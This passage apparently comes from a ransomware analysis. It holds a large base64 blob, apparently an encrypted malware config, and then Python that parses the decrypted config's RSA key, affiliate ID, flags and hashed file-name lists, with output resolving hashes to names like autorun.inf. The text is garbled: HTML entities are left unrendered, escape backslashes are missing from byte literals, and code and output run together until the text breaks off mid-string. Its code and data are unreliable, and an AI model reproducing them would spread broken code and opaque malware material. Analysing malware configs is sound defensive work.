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 x00&#39; . import base64 import time ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+24] ptr+= 24 b64_strings_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] + ptr +4 for bstr in ptxt_data[b64_strings_offset:].split(b&#39; x00&#39;): try: config_value = base64.b64decode(bstr) if is_ascii(config_value): print(&quot;string list&quot;) for s in config_value.split(b&#39; x00 x00&#39;): ss = s.replace(b&#39; x00&#39;,b&#39;&#39;) print(f&quot; t{ss}&quot;) else: print(&quot;hash list&quot;) print(config_value) for i in range(0,len(config_value),4): time.sleep(1) hash_value = struct.unpack(&#39;&lt;I&#39;,config_value[i:i+4])[0] hash_string = resolve_hash(hash_value) print(f&quot; t{hex(hash_value)} : {hash_string}&quot;) except: pass . hash list b&#39; x03 xcd x81 xf2 x8c xf5xp&amp;5~h&amp; xd7lB xe3Xi xce xc6 xa7 xd1 xf2 xa6 xc0; xa6 xe18 x0b xcbR xdd xb8 xca xdcNN x006 x95e x08 xab x94 xe3u. xae x8e x01 xae xd4%KL5y xf0 x07u xf9fk x928 xea xb7 x94 xe6fS x9bX x1b xcd{: xde ;b&#34; xba xb37: xef x00 x00 x00 x00&#39; 0xf281cd03 : 0x7078f58c : 0x687e3526 : 0x426cd726 : 0xce6958e3 : 0xf2d1a7c6 : 0xa63bc0a6 : 0xcb0b38e1 : 0xcab8dd52 : 0x4e4edc : 0x8659536 : 0x75e394ab : 0x18eae2e : 0x4b25d4ae : 0xf079354c : 0x66f97507 : 0xea38926b : 0x66e694b7 : hash list b&#39; x15 xaa xcc x86 x9b t x079 x96 xae x0c xf0V xab xc8 xfcR xa2 xd2 x82 x00 xeck x847Y x97 xdb xf5 xa6: xc2 xe4W xaa x855 xaa xe2 xcb xd1 xf7 xce xc8 x00 x00 x00 x00&#39; 0x86ccaa15 : autorun.inf 0x3907099b : boot.ini 0xf00cae96 : bootfont.bin 0xfcc8ab56 : bootsect.bak hash list b&#39; x00 x0e xb0g x00 x19 xb0 xc5 x80 x1bH xc5@ x18 xa0 xc7@ x1ap xc7@ x18 x10 xc9@ x1b xc9 xc0 x1bh xc9 x00 x1c` xc9@ x1d x90 xc9 xfe xcb 